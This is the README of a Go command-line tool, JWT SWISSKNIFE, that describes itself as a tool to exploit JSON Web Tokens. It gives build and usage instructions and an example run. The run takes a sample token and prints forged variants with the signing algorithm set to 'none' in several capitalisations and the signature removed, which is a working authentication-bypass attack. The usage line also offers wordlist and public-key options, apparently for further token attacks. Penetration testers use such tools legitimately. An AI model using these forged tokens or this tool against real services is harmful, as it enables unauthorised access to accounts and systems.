# JWT SWISSKNIFE

**DESCRIPTION**

a golang tool to exploit json webs token.

**INSTALLATION**
```bash
go build
```

**USAGE**
```bash
.\JWTSWISSKNIFE.exe [-h] -x exploit -jwt token [-pk public key file] [-w wordlist file]
```

**EXAMPLE**
```bash
PS C:\Users\TRIKKSS\Desktop\JWTSWISSKNIFE> .\JWTSWISSKNIFE.exe -jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiVFJJS0tTUyIsImFnZSI6IjEwOCB5ZWFycyJ9.9wEdP7He-vpu6fAiKEdMaSndp7BWK_RHMcGiaef4jPo -x n

     ██╗██╗    ██╗████████╗  ███████╗██╗    ██╗██╗███████╗███████╗██╗  ██╗███╗   ██╗██╗███████╗███████╗
     ██║██║    ██║╚══██╔══╝  ██╔════╝██║    ██║██║██╔════╝██╔════╝██║ ██╔╝████╗  ██║██║██╔════╝██╔════╝
     ██║██║ █╗ ██║   ██║     ███████╗██║ █╗ ██║██║███████╗███████╗█████╔╝ ██╔██╗ ██║██║█████╗  █████╗
██   ██║██║███╗██║   ██║     ╚════██║██║███╗██║██║╚════██║╚════██║██╔═██╗ ██║╚██╗██║██║██╔══╝  ██╔══╝
╚█████╔╝╚███╔███╔╝   ██║     ███████║╚███╔███╔╝██║███████║███████║██║  ██╗██║ ╚████║██║██║     ███████╗
 ╚════╝  ╚══╝╚══╝    ╚═╝     ╚══════╝ ╚══╝╚══╝ ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝     ╚══════╝

[+] alg : None
[+] jwt : eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJuYW1lIjoiVFJJS0tTUyIsImFnZSI6IjEwOCB5ZWFycyJ9

[+] alg : none
[+] jwt : eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJuYW1lIjoiVFJJS0tTUyIsImFnZSI6IjEwOCB5ZWFycyJ9

[+] alg : NONE
[+] jwt : eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJuYW1lIjoiVFJJS0tTUyIsImFnZSI6IjEwOCB5ZWFycyJ9

[+] alg : nOne
[+] jwt : eyJhbGciOiJuT25lIiwidHlwIjoiSldUIn0.eyJuYW1lIjoiVFJJS0tTUyIsImFnZSI6IjEwOCB5ZWFycyJ9

```
